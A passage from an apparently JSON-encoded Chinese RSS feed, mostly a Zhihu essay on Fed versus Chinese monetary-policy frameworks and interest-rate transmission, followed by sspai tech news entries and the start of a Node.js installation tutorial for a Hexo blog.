data-pid=\"G60N0id_\">60年代之后​，美联储开始注意到货币的数量与经济的相关性在显著下降。在70年代的两次恶性通胀后，人们对数量型调控越来越不信任。因为资金的需求函数和供给函数都太不稳定了。随着科技的进步，基础货币的需求会发生很大变化。货币的供给测量也极其困难。</p>\n<p data-pid=\"fJfxhckK\">首先，基础货币也分三六九等。现金、法定存款准备金、超额准备金本身差异很大。财政存款、金融创新等因素都会对基础货币带来突发性影响。每年交易员都会体验到春节超额准备金提取成现金时对货币市场的影响。</p>\n<p data-pid=\"VUMXeTpu\">其次，货币乘数很不稳定，也难测量。经济不好，央行再放钱，银行如果没有合适利差不愿意放贷，会大幅影响货币乘数。</p>\n<p data-pid=\"BRDbNX6z\">最后，对基础货币的过度控制会导致短期利率异常波动。因为基础货币的短期需求非常随机，央行一样无法准确预测。资金短缺造成的短期利率波动会逼迫市场卖出中长期债券，导致中长期利率的不必要波动。这会给根据中长期利率进行经济决策的实体经济带来不必要的干扰。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-9c9a2062cf94aaf7f5cc4b3503b89fdc_b.jpg\" data-size=\"normal\" data-rawwidth=\"2459\" data-rawheight=\"1351\" class=\"origin_image zh-lightbox-thumb\" width=\"2459\" data-original=\"https://pic1.zhimg.com/v2-9c9a2062cf94aaf7f5cc4b3503b89fdc_r.jpg\"><figcaption>图5、目前美联储传统和非传统的货币政策工具（图片来源：美联储）</figcaption></figure><p data-pid=\"jzyHiMTH\">经济学家找不到稳定的资金供给和需求函数，也找不到信贷总量与产出和通胀的稳定关系，不得不放弃从数量角度研究货币政策，转而寻求价格作为研究的对象。</p>\n<p data-pid=\"XuskaZSh\">70年代开始，美联储开始向以政策利率为中介目标的价格型调控转变。从这时起，存款准备金率不再频繁调整，而是使用公开市场的回购、逆回购操作调节短期资金利率。</p>\n<p data-pid=\"VFTEGyFb\">1987年，格林斯潘上任联储主席后，业界背景让其更坚决地抛弃数量化调控。1994年开始，美联储将联邦基金利率（Fed Fund Rate）设定为政策利率，每次议息会议（FOMC）后向大众公布政策利率目标水平（图3中绿色线）。1998年开始，FOMC会议记录不再使用“准备金压力”词汇，转而使用“将联邦基金利率维持在X.XX%”。</p>\n<p data-pid=\"FLAgcvZW\">如图5所示，美联储每天早晨根据机构的需求，通过公开市场操作为市场提供充足资金，以维持政策利率符合设定目标。同时，还允许金融机构日中有意外资金需求时，可以通过贴现窗口（Discount Window）发起常备融资便利（Standing Facilities）借入隔夜资金。只要有质押物，美联储不对需求提出异议（no-question-asked basis）。</p>\n<p data-pid=\"FyhyhnjD\">2004年，美联储开始使用前瞻指引（Forward Guidance），在货币政策调整前持续调整议息会议的论述，向市场传达清晰的货币政策预期。</p>\n<p data-pid=\"SePOO69-\">2008年10月，为了更好的控制短期利率，美联储开始为准备金支付利息，形成了以准备金利率为底，联邦基金目标利率为顶，宽度为25bp的利率走廊。美联储无限量地接收超额储备金。只要机构有质押品，也无限量的提供资金，用以保证市场利率在走廊之内。</p>\n<p data-pid=\"fJclO7by\">2012年，美联储开始在FOMC会议后公布点阵图（dot plot），展示委员会成员对未来几年联邦基金利率的预测分布，这进一步提高了透明度，扩大了货币政策预期对经济的影响。</p>\n<p data-pid=\"oOo4NtJt\">随着一系列的改革，短期资金利率与政策目标利率偏离度越来越小，如图3。近几年来，联邦基金利率每日波动一般只有一两个bp。</p>\n<p data-pid=\"HuWQceLW\">                       保障了均衡价格的可获取，价格才能真正成为价格。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-f40d52136887b9a780830b5191b1a340_b.jpg\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"485\" class=\"origin_image zh-lightbox-thumb\" width=\"600\" data-original=\"https://pic1.zhimg.com/v2-f40d52136887b9a780830b5191b1a340_r.jpg\"><figcaption>图6. 2020年12月FOMC会议成员对未来联邦基金目标利率的预测（图片：美联储）</figcaption></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"JbLmadub\"><b>人民币短期利率波动高的原因</b></p>\n<p data-pid=\"EUWMEaBn\">我国的货币政策是以调节货币供应量为中介目标的数量型调控。根据经济发展的需要，近年来一直致力于向市场经济主导的价格型调控转变。</p>\n<p data-pid=\"NxH2jQoi\">在数量型货币政策框架下，央行调节存款准备金数量来控制准备金的价格，即短期利率。当前央行尚在筛选政策利率，还没有实行价格调控下强力维持政策利率的公开市场操作。</p>\n<p data-pid=\"QAYI6am3\">虽然2015年央行的工作论文《利率走廊、利率稳定性和调控成本》对利率走廊做出过构想，但当前以超额准备金为下限，以SLF为上限，300 bps宽的利率走廊还很难起到稳定短期资金利率的作用（图7）。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-c50e34d3d1dc05d2842cfbaf3a7a9835_b.jpg\" data-size=\"normal\" data-rawwidth=\"781\" data-rawheight=\"238\" class=\"origin_image zh-lightbox-thumb\" width=\"781\" data-original=\"https://pic2.zhimg.com/v2-c50e34d3d1dc05d2842cfbaf3a7a9835_r.jpg\"><figcaption>图7. 银行7天回购利率与利率走廊（图片：Wind）</figcaption></figure><p data-pid=\"BT-p1f2Q\">理论上，通过公开市场操作调节准备金的供需，也是可以稳定资金价格的。</p>\n<p data-pid=\"qNnPqGJK\">但与美联储不同的是，我国货币政策目标过多，多目标之间又常有冲突。货币政策除了行使单纯的经济调节功能，还需要进行宏观风险管理，很多时候不能无限供给资金来稳定短期利率。</p>\n<p data-pid=\"NHGfas-V\">美联储面对的大都是私人金融机构，股权相对比较集中，股东受到破产威胁，一般不敢无节制地加杠杆。但是国内大银行和大企业有国家信用隐性担保、中小银行有地方政府隐性担保。就像易行长在谈《建设现代中央银行制度》时所说，金融机构和大企业的“市场纪律、破产威慑和惩戒机制尚未真正建立”。在风险收益不对称的前提下，有强烈的加杠杆冲动。</p>\n<p data-pid=\"W7NDZ3uX\">因此，央行的公开市场操作并不单纯维护利率稳定，而是要适度勒紧资金供给，以抑制信贷扩张冲动。甚至可能时不时来一个压力测试，打乱短期利率预期以压降杠杆。</p>\n<p data-pid=\"ELjGPk81\">没有每日充足的公开市场操作和随时可用的常备融资便利，脉冲式的准备金盈余或短缺就不可避免，短期利率大幅波动也就好理解了。</p>\n<p data-pid=\"F4MWVURw\">图7显示，在不同的时段，FDR007的波动时大时小，其中一个重要原因就是基础货币投放方式有过较大变化。在动态的环境中，央行预期货币需求量是很难的，市场预期央行的预期更加困难。</p>\n<p data-pid=\"bPe2wFZH\">自2001年我国加入WTO，到2014年期间，外汇是持续流入的。央行购汇增加了银行的准备金供给（图8），虽然不断提高准备金率（图9），并发行央行票据回笼基础货币（图10），但不及外储的增加规模。这段时间基础货币持续增加，因此资金价格相对稳定，可得性高。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4026c9bbf839a5a32897a048f7c0232c_b.jpg\" data-size=\"normal\" data-rawwidth=\"775\" data-rawheight=\"200\" class=\"origin_image zh-lightbox-thumb\" width=\"775\" data-original=\"https://pic1.zhimg.com/v2-4026c9bbf839a5a32897a048f7c0232c_r.jpg\"><figcaption>图8. 官方外汇储备的走势图（图片：Wind）</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-203daa2087359c4b09f68670a3ab8db7_b.jpg\" data-size=\"normal\" data-rawwidth=\"818\" data-rawheight=\"276\" class=\"origin_image zh-lightbox-thumb\" width=\"818\" data-original=\"https://pic4.zhimg.com/v2-203daa2087359c4b09f68670a3ab8db7_r.jpg\"><figcaption>图9. 人民币存款准备金率走势图（图片：Wind）</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ce93d8d88dd0ef1327a437c99c19c8d7_b.jpg\" data-size=\"normal\" data-rawwidth=\"907\" data-rawheight=\"302\" class=\"origin_image zh-lightbox-thumb\" width=\"907\" data-original=\"https://pic4.zhimg.com/v2-ce93d8d88dd0ef1327a437c99c19c8d7_r.jpg\"><figcaption>图10. 央行票据余额走势（图片：Wind）</figcaption></figure><figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-0b4ed8ce255513c0fa9d327a9bfcf9d1_b.jpg\" data-size=\"normal\" data-rawwidth=\"702\" data-rawheight=\"322\" class=\"origin_image zh-lightbox-thumb\" width=\"702\" data-original=\"https://pic2.zhimg.com/v2-0b4ed8ce255513c0fa9d327a9bfcf9d1_r.jpg\"><figcaption>图11. MLF余额逐年增长（图片：Wind）</figcaption></figure><p data-pid=\"pRrCB3kA\">2015年后我国转为外汇净流出，开始抽离基础货币。央行通过降低存款准备金和暂停发行央行票据来释放基础货币。央行票据存量从2010年的4万多亿归零后，2014年开始采用MLF继续向市场投放流动性（图11）。</p>\n<p data-pid=\"0QyCLGiD\">但2018年8月之后，MLF的存量不再增长，甚至一度下降。2018年之后的降准也会增加基础货币，但降准的频率小。尤其是监管对票据、结构性存款等多项业务的监管很大程度上改变了银行资金的供给。虽然期间央行通过更频繁公开市场操作，试图稳定资金利率。但是数量调控下央行无法恰到好处的预测供需水平，也没有合适的手段给市场传达预期。</p>\n<p data-pid=\"mCl8wjwL\">2020疫情期间就是一个典型案例。如图4，短期资金DR007下降到1%以下一段时间后，由于央行没有政策利率，也没有在公开市场强力维持利率水平，市场开始猜测长期低利率的可能，进而大举购买中长期限债券。但一段时间过后却没有看到货币政策的继续宽松，又抛售中长期债券。这种数量型调控下无法有效传递政策信息的情况，也对中长期决策带来了困扰。</p>\n<hr>\n<h2>三、为什么可交易是保障货币政策传导机制流畅的根本​？</h2>\n<p data-pid=\"UmPtYIJ1\">讨论我国的货币政策改革前，先来看一下美国建立的货币政策传导机制。</p>\n<p data-pid=\"o7iaNgDf\">如图12所示，目前美国的货币政策传导机制是:</p>\n<ul>\n<li data-pid=\"xqV3BdBG\">以美联储的政策利率为大脑；</li>\n<li data-pid=\"rL2_Ean8\">以短期货币市场利率和中长期市场利率组成的基准利率曲线为中枢神经；</li>\n<li data-pid=\"vd-SmJbU\">通过贷款、信用债、股票、通胀产品、汇率等多通道作用；</li>\n<li data-pid=\"t3RjqbMf\">最后影响总需求和物价的一个有机整体。</li>\n</ul>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-59ab04251fb067f7d3e29d3ea86bf84c_b.jpg\" data-size=\"normal\" data-rawwidth=\"2049\" data-rawheight=\"1251\" class=\"origin_image zh-lightbox-thumb\" width=\"2049\" data-original=\"https://pic1.zhimg.com/v2-59ab04251fb067f7d3e29d3ea86bf84c_r.jpg\"><figcaption>图12. 现代货币政策传导机制示意图（根据IMF图片加工）</figcaption></figure><p data-pid=\"99y5XOdh\">教科书一般从经济学的角度，分析货币政策通过利率通道、资产价格通道、信贷通道最终影响总需求和价格。美国80年代的利率市场化改革基本打通这些通道的可交易性。但是，这种传统途径通常需要数天、数月、甚至数年才能影响到实体经济的决策。例如，只有长期维持低资金利率才能让银行相信未来低利率的稳定性，从而愿意发放长期低利率贷款。</p>\n<p data-pid=\"CLeJIiSF\">而80到90年代开始建立的股票、汇率、利率、信用等市场的衍生品，让预期也变得可以交易。即货币政策对资产价格长期影响的预期可以通过衍生品交易锁定。实体经济决策者可以根据锁定的价格安排生产和消费，这让货币政策对实体经济的影响瞬间可达。这与DSGE模型内强调真实世界里预期的重要性一致。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"2lJ8BCfQ\"><b>可交易的预期</b></p>\n<p data-pid=\"CxzCbcI-\">如果美联储认为产出和通胀没有达到目标水平，可以降低政策利率（Policy rate），并通过公开市场操作释放足够的资金，将联邦基金利率和LIBOR等短期利率拉低到合意水平。</p>\n<p data-pid=\"BG__YQfT\">（这里仅介绍旧版的LIBOR IRS曲线，新版的SOFR IRS曲线替换还未完成。这个替换并不改变以下的逻辑框架，只是更适应目前银行边际成本变化，详细替换原因参见《<a href=\"https://zhuanlan.zhihu.com/p/38337365\" class=\"internal\">从LIBOR到SOFR</a>》）</p>\n<p data-pid=\"GlYc9Xo7\">挂钩LIBOR的IRS各期限利率也会随之降低：一是因为美联储会做出前瞻指引，引导市场降低远期利率的预期；二是短期利率下降后，长短期之间利差扩大，会吸引投机资本看到carry策略更好的风险收益比，买入长端，进而压低长端利率。</p>\n<p data-pid=\"ROctlCns\">以短期货币市场利率（Short-term money market rate）LIBOR和中长期利率（Market interest rate）IRS组成的整条曲线，就是所谓的基准利率曲线。</p>\n<p data-pid=\"3caqagid\">（常见很多描述认为美国的贷款和债券定价是盯住LIBOR。其实只有浮动利率贷款和债券才盯LIBOR。美国中长期固定利率债券、贷款才是主流。这些固定利率债券和贷款盯住的并不是LIBOR，而是LIBOR IRS曲线上相同期限的固定利率。这才是基准利率曲线最重要的用途）</p>\n<p data-pid=\"WGuP_GvB\">基准利率曲线会作为无套利定价的根基，以光速将货币政策意图传达到其他资产:</p>\n<ol>\n<li data-pid=\"YHSD3bIJ\">实际利率(Real rates)：根据经济学理论，投资决策更关注实际利率，而不是名义利率。通胀互换（Inflation swap）可以让投资者交易通胀预期（<img src=\"https://www.zhihu.com/equation?tex=%5Cpi%5E%7Be%7D\" alt=\"\\pi^{e}\" eeimg=\"1\"> ）。配合利率互换，投资者可以锁定实际利率水平（例如5年IRS和5年通胀互换组合可以锁定5年期实际利率水平），从而避免投资决策暴露在未来5年通胀波动下，有利于投资者更坚定地贯彻货币政策意图；</li>\n<li data-pid=\"_chwEfRq\">信用债（Credit）：所有期限的信用债收益率都会随基准利率曲线的下降而相应下降，企业的融资成本降低，促进企业投资。因为信用债的收益率不随同期限无风险利率下降的话，可以买入信用债，买入同期限CDS保护，卖出同期限国债，持有到期后获得无风险超额收益。（并且不占资金，不占风险资产）。在这种情况下，投资者也愿意接受企业发债按同期限无风险利率+同期限信用风险点差的方式确定收益率；</li>\n<li data-pid=\"_hAZyg77\">贷款（Bank lending）：银行的短期负债成本会随着短期利率下降而下降。由于LIBOR和IRS的关系，银行的中长期负债一样可以一次性地用IRS锁定更低的成本，而不是眼巴巴地期盼美联储未来一直维持低利率。这样可以在不减少信用利差的情况，更坚决的降低中长期贷款利率，促进企业投资；</li>\n<li data-pid=\"0rnYUSaH\">汇率（Exchange rate）：降低本币利率会刺激本国投资者以低成本借入长期资金，兑换外币投资于外币长期资产，这种操作会在当期抛售本币换取外币，促使本币现汇贬值，有利于扩大出口。但是资本愿意出境投资的前提是，有工具能锁定境外投资到期时以相同汇率换回本币。由本币IRS和外币IRS组合成的交叉货币互换CCS，可以完美地胜任该工作；</li>\n<li data-pid=\"MqqhlAmL\">股票（Asset price）：通过货币政策降低基准利率曲线，股票的收益（市盈率的倒数）相对中长期国债的收益率就会更有吸引力，投资者抛售国债买入股票，抬升股票估值。这一方面会刺激企业家进行资本支出创设更多企业，从而拉动投资需求。另一方面会使普通人的养老金账户升值，通过财富效应拉动消费。虽然股价和IRS没有无风险套利机制，基准利率曲线对股价的影响还无法在秒内完成，但是近年来风险平价（Risk parity）基金的增多也可以让货币政策在几周内完成对股价的影响。</li>\n</ol>\n<p data-pid=\"QwdGmWfm\">这些衍生品设计之初是为了机构之间买卖风险，它们以基准利率曲线为根基，是因为这些产品都包含了利率风险。基准利率曲线交易能帮所有的资产对冲掉利率风险，最终使得基准利率曲线成为所有产品的锚，成为整个金融市场的中枢，最后得以最高效的传达货币政策的意图。如果不是可以自由交易，基准利率曲线就不会有这样的影响力。</p>\n<p data-pid=\"Oj22lq_K\"><br><b>我国货币政策传导机制的现状</b></p>\n<p data-pid=\"9DfgOyjS\">我国央行多年来一直致力于从数量型调控到价格性调控的转型。从近期推出的政策工具和研究报告来看，当前的货币政策框架建设主要包括筛选政策利率、构建基准利率曲线、并推进贷款市场利率市场化的工作。</p>\n<p data-pid=\"IeC0PVBN\">经过多年实践，目前影响改革推进的是货币政策传导通道不畅的问题。最根本的原因是现有的很多市场没能打通，每个被隔离的市场形成独立的价格，甚至很多价格还不可交易。</p>\n<p data-pid=\"iKxRvGpG\">对标国际货币政策常用传导通道：可交易的通胀产品尚未设立，实际利率通道影响受限；资本项下还未自由兑换，汇率通道影响有限；股票市场投资群体小，没有大规模资金可以在股票与债券之间根据相对价值自由流动，财富效应通道影响有限；信用债市场有一定的传导作用，但是信用衍生品还不能单独交易，信用利差存在滞后性。</p>\n<p data-pid=\"6GeQBTBU\">货币政策改革要与传导机制的进展相匹配。所以改革的重点其实是疏通传导机制。否则货币政策只能飘在空中，无法影响到实体经济。</p>\n<p data-pid=\"nIXVzg9c\">考虑到我国金融体系以银行为主导，银行贷款是最主要的融资工具，因此先打通贷款通道的传导机制是当务之急。</p>\n<p data-pid=\"BC0rM84P\">从8月31日央行发布白皮书《参与国际基准利率改革和健全中国基准利率体系》提出考虑培育DR为政策利率，同时构建DR IRS作为银行间基准利率曲线。9月15日货币政策执行报告增刊《有序推进贷款市场报价利率改革》提出培育MLF作为中期政策利率，以LPR为贷款利率的定价基准。</p>\n<p data-pid=\"jeFAOCvU\"><br><b>政策利率选择短期利率还是中期利率？</b></p>\n<p data-pid=\"ouX_f-C5\">向价格型调控转型的工作中遇到的第一个问题就会是选哪个利率作为政策利率。</p>\n<p data-pid=\"Rj1Yl1p0\">短期利率DR还是中期利率MLF？</p>\n<p data-pid=\"4rP1KJ21\">国内讨论挂钩利率的时候，短期利率是非常受歧视的，因为它波动大。很多人喜欢使用中期利率，因为稳定。但是境外央行和市场一般使用短期利率，甚至很多时候使用隔夜利率。</p>\n<p data-pid=\"Tn-uqkzn\">如前述分析，短端利率波动大主要是央行在数量型调控下还要兼顾抑制宏观杠杆导致的。如果最终向价格型调控改革的话，选中期利率做政策利率会有很多麻烦：</p>\n<ol>\n<li data-pid=\"MZU3qWIS\">从利率的期望理论说，中期利率是它覆盖期间隔夜利率某种加权平均值的期望值。如果货币政策调整中期利率的话，会对短期利率的预期造成成倍的影响，势必进一步放大短端利率波动。从金融工程技术上说，利率曲线剥离时，如果中间期限出现跳变，对前端的短期利率影响是爆炸性的。如果货币政策不管短期的话，极易引起交易紊乱。</li>\n<li data-pid=\"Y_kuJS_T\">金融机构都有大量短期融资，如果短期利率不稳定，就会要求长期资产提供更高风险溢价才能补偿融资不稳的风险，这会抬高中长端利率水平，额外增加实体经济负债成本。</li>\n<li data-pid=\"MHjz7o7T\">根据央行《结构性流动性短缺和货币政策操作框架》，未来银行会长期存在结构性的流动性短缺。如果选择中期利率MLF作为政策利率，银行长期借入中期资金，会比借入短期资金损失一个不小的期限利差。而期限利差是银行主要收入来源之一，这会很大程度改变银行业态。</li>\n<li data-pid=\"tGxl1Wbr\">选用中期政策利率构建基准曲线会带来超级大的技术难度，参见<a href=\"https://zhuanlan.zhihu.com/p/43109547\" class=\"internal\">《LPR的困局》</a>。现在基于短期利率构建的利率模型已经比量子力学还复杂了。使用中期利率构建利率曲线对金融工程技术的挑战突破目前行业极限（LPR IRS已经是期权产品，LPR互换期权其实是期权的期权）。也非常不利于众多企业用户的理解和广泛使用。</li>\n</ol>\n<p data-pid=\"nbes9qfv\">而短期利率可以避免这种过于强烈的手段。央行可以适度调整最短端的融资成本。如果需要，可以通过前瞻指引对中期利率进行干预，通过购债计划（Asset purchase）对长期利率进行干预。这会给货币政策调控带来更多的灵活性。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"V5EpKwm_\"><b>为什么MLF-LPR是混合型政策利率？</b></p>\n<p data-pid=\"4mdF0jSn\">但是受制于市场现状，一步跨入价格型调控也不现实。要在当前经济环境下降低企业融资成本，需要使用介于数量型调控和价格型调控之间的MLF和LPR工具。</p>\n<p data-pid=\"SgltEqMn\">LPR带有一定程度的价格型调控特点：央行通过MLF向市场注入资金，边际上影响银行的负债成本，进而影响银行的LPR报价。</p>\n<p data-pid=\"Qj9rS_OT\">LPR也带有一定程度的数量型管控特点：强制要求银行在贷款定价时挂钩LPR，这样可以通过MLF间接控制贷款利率。在存款利率市场化完成前，就可以一定程度上调控贷款利率，达到让利实体企业的目的。</p>\n<p data-pid=\"01G4Jf_M\">但寄希望于MLF-LPR最终实现价格型调控，还是很有难度的。</p>\n<p data-pid=\"mZ-lpUjV\">LPR是多家银行报价以贷款余额为权重计算的平均值，并没有考虑每家机构潜在新增贷款的供给需求曲线，也没有考虑非报价行在这个价格的供需量。所以这个平均值不太可能正好等于市场的“出清”价格。</p>\n<p data-pid=\"b_KhG3Kw\">市场可以通过交易来发现价格。但不经过交易，没有一个计算体系可以计算这个出清价格。而LPR是无法交易的。</p>\n<p data-pid=\"P-FoVz7s\">LIBOR为什么可以？因为之前银行之间拆借利率就是LIBOR。现在换成SOFR也是因为目前银行之间的融资利率就是SOFR。</p>\n<p data-pid=\"nEWvnR_Y\">央行不一定愿意通过无限量资金供给或者回收来保证市场资金在MLF利率出清。即需要资金的机构可以在MLF利率充分获得资金，盈余资金的机构可以在MLF利率充分拆出资金。</p>\n<p data-pid=\"-_Dow9dT\">央行愿意的话也会遇到前述的中期利率作为政策利率的种种挑战。</p>\n<p data-pid=\"5rJmVPPm\">再往后看，LPR曲线不可交易（而LPR IRS极其复杂，几乎不可用），就无法成为整个金融市场的中枢神经。因为基准利率曲线最主要功能不是给其他资产看的，而是给其他资产对冲利率风险的。只有可交易才能真真切切地影响其他资产的定价。</p>\n<p data-pid=\"6655EHIG\">从两份文件看，央行应该是考虑到目前利率市场还存在双轨制问题，所以一方面学习境外实践，培育DR和DR IRS作为最终基准利率曲线。另一方面推动LPR在贷款市场的应用。从短期政策利率和中期政策利率同时发力突破“双轨制”对货币政策传导机制的阻塞。待未来利率市场化和货币政策转型完成，利率传导机制理顺后，货币政策再向短期利率集中。</p>\n<hr>\n<p data-pid=\"YFH0CH80\"><b>可交易性是保障货币政策传导机制畅通的根本</b></p>\n<p data-pid=\"7O7eyjCJ\">受限于目前投融资市场的现状，银行贷款仍是我国最主要的融资工具。因此，完成货币政策向实体经济传导的最关键一步还是要打通货币政策到存贷款利率的传导机制。</p>\n<p data-pid=\"jFrbPd5i\">但是无论是现在的存贷款渠道，还是将来可能的债券、股票等直接融资渠道，要建立良好的传导机制都需要一个充分可交易的市场。</p>\n<p data-pid=\"5qUdmgjR\">从存贷款渠道讲，“利率双轨”仍然是阻碍货币政策通过货币市场利率向存款和贷款传导的最大障碍。利率双轨最大的原因也是存款的“不可交易”导致的。</p>\n<p data-pid=\"xSx96ktp\">相当一部分人和机构对存款的价格敏感度不高。对于机构的有些资金（比如工资账户），以及很多个人，存款的利率差异不足以弥补换一家银行带来的折腾成本。</p>\n<p data-pid=\"uwpjA1a8\">但是监管指标对存款的过度重视，以及对同业负债比例的限制，阻碍了银行之间通过同业产品交易“存款”。这使负债能力相对弱，但是资产能力相对强的银行不得不高息揽存，导致了存款利率与货币市场利率脱轨。</p>\n<p data-pid=\"QI_jm5nE\">从债券、股票等直接融资渠道讲，要保证保障货币政策对基准利率曲线和资产价格的充分影响，需要打通分割的市场。在设计产品之初，要充分考虑产品的定价难度，降低认知成本。要充分利用做市商机制降低交易成本，充分利用衍生品机制拉平市场间价格。</p>\n<p data-pid=\"1tR90Bpb\">但是，要满足可交易性，意味着要放弃数量化调控，意味要让银行和企业时刻感受到破产威慑，要愿意自我平衡风险和收益，主动放弃过度追求扩张。</p>\n<p data-pid=\"rT-i0NG9\">这才是利率市场化最艰难的一跃。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shenyantao-60?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">StochasticWalker</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/323600594?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"当听障者遇见骨传导：韶音 OpenRun Pro 体验","date":"2022-03-10 03:32:56","description":"既有令人安心的优点，也有令人遗憾的不足。<a href=\"https://sspai.com/post/71889\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71889"},{"title":"派早报：AMD 推出新款工作站级 CPU 及 GPU、理想 L9 公布等","date":"2022-03-10 00:43:49","description":"东芝发布新款 300 Pro 系列机械硬盘、多部《使命召唤》在 Steam 国区解锁等<a href=\"https://sspai.com/post/71969\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71969"},{"title":"你只管 Markdown，它帮你 PPT：用 Deckset 一键生成精美幻灯片","date":"2022-03-09 09:26:31","description":"Matrix首页推荐Matrix是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选Matrix最优质的文章，展示来自用户的最真实的体验和观点。文章代表作者个人观点 ...<a href=\"https://sspai.com/post/71776\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71776"},{"title":"Steam Deck Polygon 评测：我的主机新宠","date":"2022-03-09 08:00:00","description":"一个从未发售过游戏主机或游戏 PC 的公司，有可能和游戏界最成熟的硬件制造商竞争吗？有可能和或许是任天堂历史上最成功的主机竞争吗？在 Switch 的时代里，Steam Deck 究竟有没有一线生机？它真有纸面上那么完美吗？<a href=\"https://sspai.com/post/71923\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71923"},{"title":"Refresh 周报 #25：Pixel 功能更新、Android 12L 正式版发布等","date":"2022-03-09 06:19:26","description":"本文来自 Refresh 周报 专栏，每周更新泛 Android 领域内容，带你回顾过去一周 Android 数码/行业领域值得关注的大小事件。<a href=\"https://sspai.com/post/71950\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71950"},{"title":"派早报：Apple 发布多款新品、Android 将支持应用归档功能等","date":"2022-03-09 00:31:08","description":"AMD 回应 Windows 10/11 卡顿问题，Linux 内核高危提权漏洞 Dirty Pipe 曝光等。<a href=\"https://sspai.com/post/71951\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71951"},{"title":"一图流｜Apple 2022 年春季新品发布会回顾","date":"2022-03-08 22:32:54","description":"2022 年 Apple 春季新品发布会一图流来啦！<a href=\"https://sspai.com/post/71949\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71949"},{"title":"在 Windows 上快速安装 Hexo · 安装 Node.js","date":"2022-01-14 10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img 